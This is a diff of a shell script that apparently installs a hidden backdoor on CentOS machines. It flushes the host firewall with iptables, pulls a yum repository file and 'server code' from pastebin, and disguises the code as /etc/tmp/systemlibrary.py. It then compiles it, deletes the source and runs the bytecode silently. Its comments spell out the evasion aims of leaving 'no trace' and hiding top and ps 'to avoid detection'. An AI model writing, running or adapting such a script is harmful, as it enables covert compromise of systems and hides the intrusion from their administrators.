@@ -1,32 +1,21 @@
-# download the CentOS-Base.repo file and overwrite the current
-# /etc/yum.repos.d/CentOS-Base.repo
-
-#{ these brackets will hide the result of the code
-# -lic runs the commands in a new shell that also closes - the goal is to run the python in this so that it won't close
-
 # Line by Line:
 # 1. opens firewall to 1337 :)
-# 2. downloads the yum config
-# 3. cleans up
-# 4. installs python
-# 5. downloads the server code
-# TODO hide the code and changes (rename server code to syslib.py)
-# 6. runs the server code and backgrounds
-# 7. Look into deletion of script as well for one last hiding bit?
-{
+# 2. downloads the yum config if python not installed
+# 3. cleans up if python not installed
+# 4. installs python if not installed
+# 5. downloads the server code and moves it to a new location
+# 6. runs the server code and backgrounds it & disowns it to ensure no trace
+
 sudo strace -o /dev/null /bin/sh -lic "iptables -F;
-curl https://pastebin.com/raw/XLiGFWha > /etc/yum.repos.d/CentOS-Base.repo;
-yum clean all;
-yum install -y python3;
-curl https://pastebin.com/raw/y0SZSyy0 > server_code.py;
+rpm --quiet --query python3 || curl https://pastebin.com/raw/XLiGFWha > /etc/yum.repos.d/CentOS-Base.repo;
+rpm --quiet --query python3 || yum clean all;
+rpm --quiet --query python3 || yum install -y python3;
+curl https://pastebin.com/raw/GFdr50Hi > server_code.py;
 mkdir /etc/tmp;
 mv server_code.py /etc/tmp/systemlibrary.py;
-python3 /etc/tmp/systemlibrary.py
+python3 -m compileall .;
+rm /etc/tmp/systemlibrary.py;
+python3 -W ignore /etc/tmp/__pycache__/systemlibrary.cpython-36.pyc
 "
-} &> /dev/null & 
 
-# hide top and ps to avoid detection
-
-# download the server executable
-
-# wait for completion then run
+# TODO hide top?
